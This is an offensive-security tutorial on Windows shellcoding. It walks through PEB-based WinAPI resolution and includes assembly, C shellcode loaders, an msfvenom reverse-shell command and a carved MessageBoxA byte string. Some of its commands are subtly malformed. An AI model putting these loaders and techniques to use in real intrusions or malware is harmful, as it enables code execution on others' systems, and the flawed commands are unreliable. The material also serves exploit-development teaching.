---
description: 07/15/2025
cover: ../../.gitbook/assets/e072fdcd-a31e-493e-bfd3-0fb6102027a0.jpg
coverY: 102.54599175465492
---

# ⚔️ Windows Shellcoding (in-depth)

<figure><img src="../../.gitbook/assets/original-f4e77850a3602f288f25329efb0b9670.webp" alt="" width="563"><figcaption></figcaption></figure>

## Motivation

_<mark style="color:yellow;">**The primary focus of this writeup is to showcase the beauty of the Windows operating system, the "science" and "anatomy" behind it, as well as its overall complexity that we all take for granted.**</mark>_&#x20;

_**The motivation behind this stems from the trials and tribulations I faced when I was tasked with developing and weaponizing Windows shellcode to further extend my offensive security toolkit. The main obstacles arose once I quickly realized that Windows shellcoding is not as straightforward as Linux shellcoding is.**_

_**One issue about the current Windows shellcoding knowledge base that is public is that it is not well documented and (in my opinion) is not well explained.**_&#x20;

_**There is an EXTREME LACK of information out there about Windows shellcoding (the ones that do exist overcomplicate things and make life difficult — I'm striving to make this easy on my audience).**_&#x20;

_**I hate to be that guy but as a cyber security community, we need to do better and make this information more accessible to better all of us.**_

* _**This was created so you do not have to go through the same struggle**_

_**Here, we are going to explain exactly what shellcode is, where it "comes" from, and how it can be leveraged in offensive cyber security engagements. You are also going to learn an in-depth knowledge base of how you can implement it in your exploits because I will be explaining how to craft your own shellcode and generate it so you can add it to your offensive security toolkit.**_&#x20;

## What is Shellcode?

Shellcode is a piece of machine code (often very small) that is derived from Assembly code.

* This allows for direct access/control to the Central Processing Unit (CPU)
* Assembly allows for direct, low-level instructions that can be ran directly on the CPU

Shellcode can be interpreted and can exist in multiple different ways. In other words, shellcode can be explained as a small program that is executed after exploiting a software vulnerability.&#x20;

* Usually injected into memory

### What can Shellcode do?

<figure><img src="../../.gitbook/assets/original-96bcc80d639eebc71eb8752d1491565e.gif" alt="" width="375"><figcaption></figcaption></figure>

**Shellcode is capable of the following:**

* Execute a shell on the target system (often times in the form of a reverse or bind shell)
* Open a backdoor
* Act as a "dropper", calling out to a malicious C2 for commands or call out to a web server to serve malware to the target system
* Aid in Privilege Escalation
* And so much more...

### How Shellcode is Delivered to a Target

There is a wide range of attack vectors.

1. Memory corruption bugs
2. Network-based delivery
3. Local Privilege Escalation
4. Local file-based delivery
5. "Loaders"
6. Physical/external delivery mechanisms

### Where Does Shellcode Come From?

**There are two primary techniques of obtaining/crafting shellcode:**

1. _<mark style="color:yellow;">**Hackers can create their own Assembly programs**</mark>_<mark style="color:yellow;">.</mark> Then, "carve" (using `objdump`) out the core malicious instructions and obtain a byte string for usage in another delivery technique (e.g. loader).
   1. Essentially convert machine instructions (opcode -> byte string).
   2. Least convenient, however is the most stealthy, but is time consuming (time for development).
2. _<mark style="color:yellow;">**Generated via**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`msfvenom`**</mark>_<mark style="color:yellow;">,</mark> <mark style="color:yellow;"></mark>_<mark style="color:yellow;">**or obtained from**</mark>_ [Exploit-DB](https://www.exploit-db.com/), [ShellStorm](https://shell-storm.org/shellcode/index.html), GitHub, or other third-party source.
   1. Most convenient option, least trustworthy (because it comes from external sources listed above), and there is likely already security signatures created for that piece of shellcode.

We can generate shellcode via `msfvenom` by using the following command:

```
msfvenom -payload windows/shell_reverse_tcp LHOST=localhost LPORT=1337 -f -c
```

This will generate a reverse shell using the `x86` architecture for Windows on `localhost` using port `1337` in C programming language format.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## How does Windows Shellcode Differ From Linux Shellcode?

### Windows

* Different Calling Convention, no usage of syscall numbers or direct syscalls
* Relies on the usage of the WinAPI (e.g. `WinExec()`, `CreateProcessA()`, `LoadLibrary()`, and `GetProcAddress()`
* API functions must be resolved at runtime
  * (e.g.) `kernel32.dll`/`user32.dll`
  * Shellcode _**MUST**_ first locate DLLs in memory via the Process Environment Block (`PEB`) and Thread Environment Block (`TEB`)
  * Parse the associated export table
  * Resolve function addresses dynamically&#x20;
  * This process can always be seen within the first few instructions of the Assembly shellcode
  * Windows shellcode is naturally larger than Linux shellcode because of the mandatory dynamic function address resolving implementation

### Linux

* Features a simple, yet intuitive syscall interface
* Shellcode will often rely on `0x80` or `syscall` instructions to make direct syscalls
* Nine times out of ten, Linux shellcode is usually smaller in size compared to Windows shellcode

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## What are Processes and Threads

This is to grant us more context on why we must dynamically resolve function addresses at runtime when developing shellcode on Windows.

### Processes

Processes are a program or application that is running within a Windows Operating System (OS).

* Can be started by a user or by the OS itself
* `CreateProcess()` -> `CreateProcessInternal()` -> `NtCreateUserProcess()` (lives inside of `ntdll.dll`)
* Each process is associated with a `TEB` and a `PEB`
  * The `TEB` points to the associated `PEB`

### Threads

A thread is a subset of execution (smaller context) and can be explained as a set of instructions that can be executed independently within a process. Often times to increase the efficiency of a program and allows for multitasking and simultaneous job execution.

* Each thread has its own Thread Local Storage (TLS)
* The TLS lies within the `TEB`

### Process Creation Process

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## The Process Environment Block (PEB) & Thread Environment Block (TEB)

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

### [PEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)

`TEB`s point to the `PEB`.

The PEB holds information of every individual process that is running in userland. It contains binary info, heap info, and more.

```cpp
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

### [TEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb)

Responsible for holding information and other context about the thread.

```cpp
typedef struct _TEB {
  PVOID Reserved1[12];
  PPEB  ProcessEnvironmentBlock;
  PVOID Reserved2[399];
  BYTE  Reserved3[1952];
  PVOID TlsSlots[64];
  BYTE  Reserved4[8];
  PVOID Reserved5[26];
  PVOID ReservedForOle;
  PVOID Reserved6[4];
  PVOID TlsExpansionSlots;
} TEB, *PTEB;
```

### Similarities

Both are internal Windows data structures that are used by the OS and can be leveraged by malware/exploit developers.

* Understanding both is considered mandatory when it comes to "shellcoding" in Windows
* Unlike on Linux, we are unable to rely on direct syscalls, but rather rely on leveraging the kernel APi or WinAPI to call various functions in order to make out shellcode perform malicious actions

### What are the relationship between the two?

Below showcases at a high-level, what our shellcode must perform before we can resolve WinAPI functions and begin to perform malicious actions on Windows.

Shellcode on Windows works by navigating through loaded modules (DLLs) by:

1. Reading `PEB` -> `LDR` -> `InMemoryOrderModuleList` (linked list).
2. Iterates through the linked list to find `kernel32.dll` (always loaded in memory).
3. Parses through the export table to find various WinAPI functions such as `GetProcAddress()`, `LoadLibraryA()`, etc.

#### Why?

WinAPI calls must be found dynamically within memory from DLLs like `kernel32.dll`.

## Trials and Tribulations of Windows Shellcoding: Undocumented Structures

### Explanation and Roles That Undocumented Structures Play in Windows Exploit Development

This is an extremely interesting topic.

You might be asking why they exist. This is a great critical thinking opportunity and really amazed me and sparked my curiosity immensely.&#x20;

Windows internals are comprised of a variety of undocumented data structures that are crucial and essential to the operations of the Windows OS.

* They remain "undocumented" to protect both the OS and its users
* Makes life harder on reverse engineers, malware authors, security researchers, and exploit developers
* We can see undocumented structures in action by viewing them in memory at runtime via a debugger or other utility as well as the official Microsoft Windows documentation pages
  * Windows documentation will showcase the data structure and we know that it is undocumented when we see elements within the data structure labeled, "`Reserved` for internal use by the operating system"

<figure><img src="../../.gitbook/assets/image (239).png" alt="" width="563"><figcaption></figcaption></figure>

### Workarounds?

In order to get around this obstacle, there are a few things that we can do.

1. Utilize "documentation" sites, we can utilize other reverse engineered data structures that have been publicly released.
   1. [Vergilius](https://www.vergiliusproject.com/)
   2. [NTAPI Undocumented](http://undocumented.ntinternals.net/) Functions/Structures
2. Utilize debugging tools to track tools to track what types of data types and sizes are used to grant additional context on the element's purpose. Such as `WinDbg` or `x64`/`x86dbg`.

For more information, check out my other writeup on [undocumented-structures.md](undocumented-structures.md "mention").

## Anatomy of Windows Shellcode

Windows shellcode can be broken down into three primary parts.

1. _**Assembly Code**_

<figure><img src="../../.gitbook/assets/image (240).png" alt="" width="563"><figcaption></figcaption></figure>

It is then converted into a something that we can use: _**Linked, Compiled, and "Carved" out via `objdump`**_.

<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

After linking and compiling our Assembly code into a binary blob (object) and a program, we can obtain a byte string that we can implement into what is known as a "loader".

2. _**Converted into a Byte String**_

This performs the "bad stuff" obtained from the Assembly code from step one.

<figure><img src="../../.gitbook/assets/image (242).png" alt="" width="563"><figcaption></figcaption></figure>

3. Executing Shellcode in Memory via a "Loader"

This is the act of executing shellcode in memory.

{% hint style="info" %}
**Advanced:** _Payloads can be encrypted or encoded to evade AV/EDR solutions._
{% endhint %}

## "Loaders"

This is a lightweight program that has the ability to execute our shellcode in memory at a high-level and simple implementation.

An example "loader" in C++ can be found below.

`loader.cpp`:

```cpp
#include <Windows.h>
#include <time.h>

int main() {
    
    // Instantiate our shellcode buffer to "hold" our malicious shellcode
    CHAR shellcode[] =  
"\x48\x31\xc9\x48\x81\(...)";
    
    int(*loader)(); // Create a function pointer called loader
    loader = (int(*)())shellcode; // cast shellcode to be a function pointer
    loader(); // call the function which will exec our shellcode
    return 0; // return
}     
```

**There is also this really simple implementation I found on Exploit-DB that acts as a "loader" (testing required):**

```c
#include<stdio.h>

char shellcode[]=\

"\x31\xc9\x64\xa1\(...)";

main()
{

(* (int(*)()) shellcode)();
}
```

## Dynamic WinAPI Function Address Resolving: Roles of `PEB` & `GetProcAddress()`

This may seem complicated, but trust me when I say this, it is much easier once you get it. Stick with me.&#x20;

_<mark style="color:yellow;">**This is crucial to understand:**</mark>_ We can utilize this same EXACT method/implementation logic to dynamically resolve WinAPI function addresses every single time that we want to craft shellcode!&#x20;

* There is no need to change it unless you want to or need to, this will work consistently every time you develop shellcode

### High-Level Breakdown

1. Shellcode
2. Locate `kernel32.dll` in memory via `PEB`
3. Use GetProcAddress() to Resolve `WinExec()`
4. We can now call `WinExec("cmd.exe")`

<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption><p>Viewing <code>PEB</code> in memory</p></figcaption></figure>

### More Detailed Explanation

<figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

### Full WinAPI Function Address Resolving Logic (Code)

`ResolveWinApiFunctions.asm`:

```nasm
; "Simple" Assembly program that dynamically resolves the PEB 
;to find GetProcAddress/LoadLibraryA to locate MessageBoxA and will invoke it

start:                                 
    mov   ebp, esp                   ;
    add   esp, 0xfffff9f0            ;   Avoid NULL bytes

find_kernel32:                     
    xor   ecx, ecx                   ;   ECX = 0
    mov   esi,fs:[ecx+0x30]          ;   ESI = &(PEB) ([FS:0x30])
    mov   esi,[esi+0x0C]             ;   ESI = PEB->Ldr
    mov   esi,[esi+0x1C]             ;   ESI = PEB->Ldr.InInitOrder

next_module:                       
    mov   ebx, [esi+0x08]            ;   EBX = InInitOrder[X].base_address
    mov   edi, [esi+0x20]            ;   EDI = InInitOrder[X].module_name
    mov   esi, [esi]                 ;   ESI = InInitOrder[X].flink (next)
    cmp   [edi+12*2], cx             ;   (unicode) modulename[12] == 0x00 ?
    jne   next_module                ;   No: try next module

find_function_shorten:             
    jmp find_function_shorten_bnc    ;   Short jump

find_function_ret:                 
    pop esi                          ;   POP the return address from the stack
    mov   [ebp+0x04], esi            ;   Save find_function address for later usage
    jmp resolve_symbols_kernel32     ;

find_function_shorten_bnc:            
    call find_function_ret           ;   Relative CALL with negative offset

find_function:                     
    pushad                           ;   Save all registers
    mov   eax, [ebx+0x3c]            ;   Offset to PE Signature
    mov   edi, [ebx+eax+0x78]        ;   Export Table Directory RVA
    add   edi, ebx                   ;   Export Table Directory VMA
    mov   ecx, [edi+0x18]            ;   NumberOfNames
    mov   eax, [edi+0x20]            ;   AddressOfNames RVA
    add   eax, ebx                   ;   AddressOfNames VMA
    mov   [ebp-4], eax               ;   Save AddressOfNames VMA for later

find_function_loop:                
    jecxz find_function_finished     ;   Jump to the end if ECX is 0
    dec   ecx                        ;   Decrement our names counter
    mov   eax, [ebp-4]               ;   Restore AddressOfNames VMA
    mov   esi, [eax+ecx*4]           ;   Get the RVA of the symbol name
    add   esi, ebx                   ;   Set ESI to the VMA of the current symbol name

compute_hash:                      
    xor   eax, eax                   ;   NULL EAX
    cdq                              ;   NULL EDX
    cld                              ;   Clear direction

compute_hash_again:                
    lodsb                            ;   Load the next byte from esi into al
    test  al, al                     ;   Check for NULL terminator
    jz    compute_hash_finished      ;   If the ZF is set, we've hit the NULL term
    ror   edx, 0x0d                  ;   Rotate edx 13 bits to the right
    add   edx, eax                   ;   Add the new byte to the accumulator
    jmp   compute_hash_again         ;   Next iteration

compute_hash_finished:             

find_function_compare:             
    cmp   edx, [esp+0x24]            ;   Compare the computed hash with the requested hash
    jnz   find_function_loop         ;   If it doesn't match go back to find_function_loop
    mov   edx, [edi+0x24]            ;   AddressOfNameOrdinals RVA
    add   edx, ebx                   ;   AddressOfNameOrdinals VMA
    mov   cx,  [edx+2*ecx]           ;   Extrapolate the function's ordinal
    mov   edx, [edi+0x1c]            ;   AddressOfFunctions RVA
    add   edx, ebx                   ;   AddressOfFunctions VMA
    mov   eax, [edx+4*ecx]           ;   Get the function RVA
    add   eax, ebx                   ;   Get the function VMA
    mov   [esp+0x1c], eax            ;   Overwrite stack version of eax from pushad

find_function_finished:            
    popad                            ;   Restore registers
    ret                              ;

resolve_symbols_kernel32:        
    push 0xec0e4e8e                  ;   LoadLibraryA hash
    call dword  [ebp+0x04]           ;   Call find_function
    mov   [ebp+0x10], eax            ;   Save LoadLibraryA address for later usage
    push 0x78b5b983                  ;   TerminateProcess hash
    call dword  [ebp+0x04]           ;   Call find_function
    mov   [ebp+0x14], eax            ;   Save TerminateProcess address for later usage

load_user32_lib:                 
    xor eax, eax                     ;  EAX = Null
    mov ax, 0x6c6c;                  
    push eax;                        ; Stack = "ll"
    push dword 0x642e3233;           ; Stack = "32.dll"
    push dword 0x72657355;           ; Stack = "User32.dll"
    push esp                         ; Stack = &("User32.dll")
    call dword  [ebp+0x10]           ; Call LoadLibraryA

resolve_symbols_user32:        
    mov   ebx, eax                  ;  Move the base address of user32.dll to EBX
    push 0xbc4da2a8                 ;  MessageBoxA hash
    call dword  [ebp+0x04]          ;  Call find_function
    mov   [ebp+0x18], eax           ;  Save MessageBoxA address for later usage

; [!] Implement the malicious logic below this line
```

### How do we always know where the PEB (and our functions are)?

As stated before, we can rely on this technique time after time again in order to reliably dynamically resolve our runtime addresses of functions.

**Here are the steps that we need to include within our shellcode at the beginning before we can get into the malicious side of things:**

_**So, in order to develop shellcode on Windows, each time, we must perform the following:**_

1. Dynamically resolve addresses by locating the `PEB` (this can be thought of as a "handbook" that contains pointers to functions e.g. an array of pointers).
2. Locate the `PEB` offset, which is always `0xC`, which is a pointer to `PEB_LDR_DATA` (which holds modules — DLLs that have been loaded into userland memory).
3. Then, `PEB` + `0xC` -> `kernel32.dll` entry (base of `kernel32.dll`).
4. We then need one more thing, when a DLL is dynamically loaded, it is stored at the offset of `DllBase`, or `0x18` (always) — this is the start of the linked list, which is the offset of `inMemoryOrderLinks` (offset `0x8`).
5. Lastly to get to the function, we can programmatically always rely on the same equation each time that we write our Windows shellcode: `DLLBase - InMemoryOrderLinks = 0x18 - 0x8 = 0x10` — this allows us to find the base of `kernel32.dll`.

<figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

## Perspective is Everything (C vs. ASM)

{% hint style="info" %}
Shellcode _**must**_ be written in low-level Assembly for precision, compactness, and stealth.

The C programming language offers enhanced clarity, but the more high-level you get, the more control you will lose.
{% endhint %}

### C Representation

The same thing that we can do in Assembly in over one hundred or more lines of code, we can do in C/C++ in under five lines.

`WinExec.c`:

```c
int main() {
    WinExec("cmd.exe", 0);
    
    return 0;
}
```

**This showcases the following:**

* Clear WinAPI usage
* Very easy to understand
* Obvious loss of explicit control

### Assembly Representation

1. Requires dynamic resolvement of WinAPI functions for use (shown in prior slide) — "Walk" the `PEB`.
2. Parse Portable Executable (PE) headers -> Locate export table
3. Find `GetProcAddress()`.
4. Resolve address of `WinExec()`.
5. Call `WinExec("cmd.exe", 0).`

**This showcases the following:**

* Confusing/Complex API usage
* More convoluted
* However, it is obvious that we gain more explicit control of telling the CPU exactly what we want to do, when we want to do it, and how

[`WinExec.asm`](https://www.exploit-db.com/exploits/39900):

```nasm
section .text
  	global _start
_start:

;Finding base address of kernel32.dll

xor ecx,ecx
mov eax,[fs:0x30] ;loading PEB(Process Environment Block) in Eax 
mov eax,[eax+0xc] ;Eax=PEB->Ldr
mov esi,[eax+0x14] ;Eax=Peb->Ldr.InMemOrderModuleList
lodsd ;Eax=second module of InMemOrderModuleList (ntdll.dll)
xchg eax,esi ;Eax=Esi ,Esi=Eax
lodsd ;Eax=third module of InMemOrderModuleList (kernel32.dll)
mov ebx,[eax+0x10] ;Ebx=base Address of Kernel32.dll (PVOID Dllbase)

;-------------------------------------------------------------------------------------------------------



;Finding Export table of Kernel32.dll

mov edx,[ebx+0x3c] ;(kernel32.dll base address+0x3c)=DOS->e_lfanew
add edx,ebx ;(DOS->e_lfanew+base address of kernel32.dll)=PE Header
mov edx,[edx+0x78] ;(PE Header+0x78)=DataDirectory->VirtualAddress
add edx,ebx ; (DataDirectory->VirtualAddress+kernel32.dll base address)=Export table of kernel32.dll (IMAGE_EXPORT_DIRECTORY)
mov esi,[edx+0x20] ;(IMAGE_EXPORT_DIRECTORY+0x20)=AddressOfNames
add esi,ebx ; ESI=(AddressOfNames+kernel32.dll base address)=kernel32.dll AddressOfNames
xor ecx,ecx

;--------------------------------------------------------------------------------------------------------------


;finding GetProcAddress function name

Get_func:

inc ecx ;Incrementing the Ordinal
lodsd ;Get name Offset
add eax,ebx ;(name offset+kernel32.dll base address)=Get Function name
cmp dword [eax],0x50746547 ;GetP
jnz Get_func
cmp dword [eax+0x4],0x41636f72 ; rocA
jnz Get_func
cmp dword [eax+0x8],0x65726464 ; ddre
jnz Get_func

;-----------------------------------------------------------------------------------------------------------



;finding the address of GetProcAddress

mov esi,[edx+0x24] ;Esi=(IMAGE_EXPORT_DIRECTORY+0x24)=AddressOfNameOrdinals
add esi,ebx ;(AddressOfNameOrdinals+base address of kernel32.dll)=AddressOfNameOrdinals of kernel32.dll
mov cx,[esi+ecx*2] ;CX=Number of Function
dec ecx
mov esi,[edx+0x1c] ;(IMAGE_EXPORT_DIRECTORY+0x1c)=AddressOfFunctions
add esi,ebx ;ESI=beginning of Address table
mov edx,[esi+ecx*4] ;EDX=Pointer(offset)
add edx,ebx ;Edx=Address of GetProcAddress

;-------------------------------------------------------------------------------------------------------

;backing up address of GetProcAddress because EAX,EBX,EDX,ECX Register value will be changed after calling function
xor esi,esi
push edx
pop esi

;----------------------------------------

;backing up kernel32.dll base address
xor edi,edi
push ebx
pop edi

;------------------------
;Finding address of Winexe()
xor ecx,ecx
push ecx
push 0x00636578
push 0x456e6957

mov ecx,esp

push ecx
push ebx

call edx
;-----------------------
;finding address of ExitProcess
xor ecx,ecx
push ecx
push 0x00737365
push 0x636f7250
push 0x74697845

mov ecx,esp

push ecx
push edi

xor edi,edi
mov edi,eax ;address of WinExec

call esi

;---------------

xor esi,esi
push eax
pop esi ;address of ExitProcess
;-------------------
;calling winexec
xor ecx,ecx
push ecx
push 0x00657865
push 0x2e646d63

mov ecx,esp

push 0
push ecx

call edi

;--------------
;exiting
push 0
call esi
```

Here, what we can do in C/C++ in less than five lines of code, will take over one hundred lines of code in Assembly.

## Why `MessageBoxA()` is a "Solid" Beginner Payload

<figure><img src="../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

When starting off developing shellcode or exploiting a discovered vulnerability, the most efficient and reliable way to test "exploitability" is to leverage a lightweight and non-complex shellcode program that can be repeated consistently without much overhead (e.g. networking, complex routines, or extensive WinAPI calls).&#x20;

A great starting point in testing successful exploitation using shellcode would be to use `MessageBoxA()` and there are a few good reasons for this.

Those being:

1. It is a simple WinAPI call that takes only four arguments:
   1. Owner window
   2. Message
   3. Title
   4. Style
2. Rapidly confirms successful code execution visually.
3. Instant gratification — able to identify visually that the exploit worked immediately.
4. Requires ZERO complex setup or external networking/communication.
5. Avoids additional overhead of spawning other processes, allocating memory, or handling strings externally.
6. Virtually no dependencies as it is part of `user32.dll`, almost loaded in any GUI application.

## Building Your First Shellcode

#### Goals

1. Writing `MessageBoxA()` shellcode in C/ASM
2. Extracting and printing as a byte string
3. Compiling to raw shellcode via `msfvenom`, `nasm`, or `gcc + objdump`

### Writing `MessageBoxA()` in C/ASM

**`helloworld.c`:**

```cpp
#include <windows.h>

int main(void)
{

    MessageBoxW(NULL, L"HELLO WORLD From MessageBoxA!!", L"HELLO WORLD From MessageBoxA!!", MB_YESNOCANCEL);

    return EXIT_SUCCESS;

}
```

**We can compile this into a PE binary via:**

```
i686-w64-mingw32-gcc-15.1.0.exe -m32 loader.c -o loader.exe -fno-stack-protector -no-pie
```

**Now, let's do it in Assembly:**

**`MessageBoxA.s`:**

```nasm
; "Simple" Assembly program that dynamically resolves the PEB 
;to find GetProcAddress/LoadLibraryA to locate MessageBoxA and will invoke it

start:                                 
    mov   ebp, esp                   ;
    add   esp, 0xfffff9f0            ;   Avoid NULL bytes

find_kernel32:                     
    xor   ecx, ecx                   ;   ECX = 0
    mov   esi,fs:[ecx+0x30]          ;   ESI = &(PEB) ([FS:0x30])
    mov   esi,[esi+0x0C]             ;   ESI = PEB->Ldr
    mov   esi,[esi+0x1C]             ;   ESI = PEB->Ldr.InInitOrder

next_module:                       
    mov   ebx, [esi+0x08]            ;   EBX = InInitOrder[X].base_address
    mov   edi, [esi+0x20]            ;   EDI = InInitOrder[X].module_name
    mov   esi, [esi]                 ;   ESI = InInitOrder[X].flink (next)
    cmp   [edi+12*2], cx             ;   (unicode) modulename[12] == 0x00 ?
    jne   next_module                ;   No: try next module

find_function_shorten:             
    jmp find_function_shorten_bnc    ;   Short jump

find_function_ret:                 
    pop esi                          ;   POP the return address from the stack
    mov   [ebp+0x04], esi            ;   Save find_function address for later usage
    jmp resolve_symbols_kernel32     ;

find_function_shorten_bnc:            
    call find_function_ret           ;   Relative CALL with negative offset

find_function:                     
    pushad                           ;   Save all registers
    mov   eax, [ebx+0x3c]            ;   Offset to PE Signature
    mov   edi, [ebx+eax+0x78]        ;   Export Table Directory RVA
    add   edi, ebx                   ;   Export Table Directory VMA
    mov   ecx, [edi+0x18]            ;   NumberOfNames
    mov   eax, [edi+0x20]            ;   AddressOfNames RVA
    add   eax, ebx                   ;   AddressOfNames VMA
    mov   [ebp-4], eax               ;   Save AddressOfNames VMA for later

find_function_loop:                
    jecxz find_function_finished     ;   Jump to the end if ECX is 0
    dec   ecx                        ;   Decrement our names counter
    mov   eax, [ebp-4]               ;   Restore AddressOfNames VMA
    mov   esi, [eax+ecx*4]           ;   Get the RVA of the symbol name
    add   esi, ebx                   ;   Set ESI to the VMA of the current symbol name

compute_hash:                      
    xor   eax, eax                   ;   NULL EAX
    cdq                              ;   NULL EDX
    cld                              ;   Clear direction

compute_hash_again:                
    lodsb                            ;   Load the next byte from esi into al
    test  al, al                     ;   Check for NULL terminator
    jz    compute_hash_finished      ;   If the ZF is set, we've hit the NULL term
    ror   edx, 0x0d                  ;   Rotate edx 13 bits to the right
    add   edx, eax                   ;   Add the new byte to the accumulator
    jmp   compute_hash_again         ;   Next iteration

compute_hash_finished:             

find_function_compare:             
    cmp   edx, [esp+0x24]            ;   Compare the computed hash with the requested hash
    jnz   find_function_loop         ;   If it doesn't match go back to find_function_loop
    mov   edx, [edi+0x24]            ;   AddressOfNameOrdinals RVA
    add   edx, ebx                   ;   AddressOfNameOrdinals VMA
    mov   cx,  [edx+2*ecx]           ;   Extrapolate the function's ordinal
    mov   edx, [edi+0x1c]            ;   AddressOfFunctions RVA
    add   edx, ebx                   ;   AddressOfFunctions VMA
    mov   eax, [edx+4*ecx]           ;   Get the function RVA
    add   eax, ebx                   ;   Get the function VMA
    mov   [esp+0x1c], eax            ;   Overwrite stack version of eax from pushad

find_function_finished:            
    popad                            ;   Restore registers
    ret                              ;

resolve_symbols_kernel32:        
    push 0xec0e4e8e                  ;   LoadLibraryA hash
    call dword  [ebp+0x04]           ;   Call find_function
    mov   [ebp+0x10], eax            ;   Save LoadLibraryA address for later usage
    push 0x78b5b983                  ;   TerminateProcess hash
    call dword  [ebp+0x04]           ;   Call find_function
    mov   [ebp+0x14], eax            ;   Save TerminateProcess address for later usage

load_user32_lib:                 
    xor eax, eax                     ;  EAX = Null
    mov ax, 0x6c6c;                  
    push eax;                        ; Stack = "ll"
    push dword 0x642e3233;           ; Stack = "32.dll"
    push dword 0x72657355;           ; Stack = "User32.dll"
    push esp                         ; Stack = &("User32.dll")
    call dword  [ebp+0x10]           ; Call LoadLibraryA

resolve_symbols_user32:        
    mov   ebx, eax                  ;  Move the base address of user32.dll to EBX
    push 0xbc4da2a8                 ;  MessageBoxA hash
    call dword  [ebp+0x04]          ;  Call find_function
    mov   [ebp+0x18], eax           ;  Save MessageBoxA address for later usage

call_MessageBoxA:                  
    xor eax, eax                    ; EAX = NULL
    mov ax, 0x7373                  ; "ss"
    push eax                        ; Stack = "ss"
    push dword 0x00002121
    push dword 0x41786f42
    push dword 0x65676173
    push dword 0x73654d20
    push dword 0x6d6f7246           ; Stack = "..."
    push dword 0x20444c52          ; Stack = " ..."
    push dword 0x4f57204f           ; Stack = "..."
    push dword 0x4c4c4548           ; Stack = "HELLO WORLD From MessageBoxA!!"
    push esp                        ; Stack = &("HELLO WORLD From MessageBoxA!!")
    mov ebx, [esp]                  ; EBX = &(push_inst_greetings)
    xor eax, eax                    ; EAX = NULL
    push eax                        ; uType
    push ebx                        ; lpCaption
    push ebx                        ; lpText
    push eax                        ; hWnd
    call dword  [ebp+0x18]       ; Call MessageBoxA

call_TerminateProcess:             
    xor eax, eax                    ;  EAX = null
    push eax                        ;  uExitCode
    push 0xffffffff                 ;  hProcess
    call dword  [ebp+0x14]       ;  Call TerminateProcess
```

**Link and Compile:**

```
nasm -f win32 MessageBoxA.s -o MessageBoxA.o ; ld -m i386pe -o MessageBoxA-ASM.exe MessageBoxA.o
```

**"Carve" out shellcode (you can setup a WSL instance on your Windows exploit development machine and run this in the same environment to gain access to Linux binaries):**

```
objdump.exe -d ./MessageBoxA.s|grep -e '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' 
-s |sed 's/^/"/'|sed 's/$/"/g'
```

**You will then obtain a byte string that you can place within your `shellcode` buffer inside of your "loader" (it will appear something similar to the following):**

```
"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x10\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x55\x73\x65\x72\x54\xff\x55\x10\x89\xc3\x68\xa8\xa2\x4d\xbc\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x73\x73\x50\x68\x21\x21\x00\x00\x68\x42\x6f\x78\x41\x68\x73\x61\x67\x65\x68\x20\x4d\x65\x73\x68\x46\x72\x6f\x6d\x68\x52\x4c\x44\x20\x68\x4f\x20\x57\x4f\x68\x48\x45\x4c\x4c\x54\x8b\x1c\x24\x31\xc0\x50\x53\x53\x50\xff\x55\x18\x31\xc0\x50\x6a\xff\xff\x55\x14\xff\xff\xff\xff\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00";
```

**Switch back to Powershell.exe instance in Code and compile the loader.c binary into a .exe with the newly appended shellcode in the buffer:**

```
i686-w64-mingw32-gcc-15.1.0.exe -m32 loader.c -o loader.exe -fno-stack-protector -no-pie
```

